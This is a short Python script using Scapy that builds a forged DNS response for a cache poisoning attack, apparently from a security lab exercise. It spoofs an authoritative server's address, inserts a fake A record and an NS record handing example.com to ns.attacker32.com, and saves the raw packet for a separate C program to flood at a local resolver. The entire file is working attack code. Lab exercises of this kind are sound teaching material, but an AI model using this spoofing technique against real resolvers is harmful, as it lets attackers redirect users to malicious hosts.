#!/usr/bin/python3  

from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNSRR, DNS, DNSQR



# Parameters
local_dns_server = '10.9.0.53'    
target_dns_server = '199.43.135.53' 

name = 'twysw.example.com'  # hostname used in attack
domain = "example.com"
ns = "ns.attacker32.com"

# Construct the DNS headers and payload
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name,type='A',rdata='1.2.3.4',ttl=259200)  # Create DNS answer
NSsec = DNSRR(rrname=domain,type='NS',rdata=ns,ttl=259200)
dns = DNS(id=0xAAAA,aa=1,ra =0 ,rd=0,cd =0 ,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Anssec,ns=NSsec)  # DNS response packet

# Construct the full packet (IP + UDP + DNS)
ip = IP(src=target_dns_server ,dst=local_dns_server,chksum=0)  
udp = UDP(sport=53 ,dport=33333,chksum=0)                           # UDP header
response = ip / udp / dns                               # Full response packet

# Save the packet to a file, which will be used in the C program
with open("ip_resp.bin", "wb") as f:
    f.write(bytes(response))
    response.show()

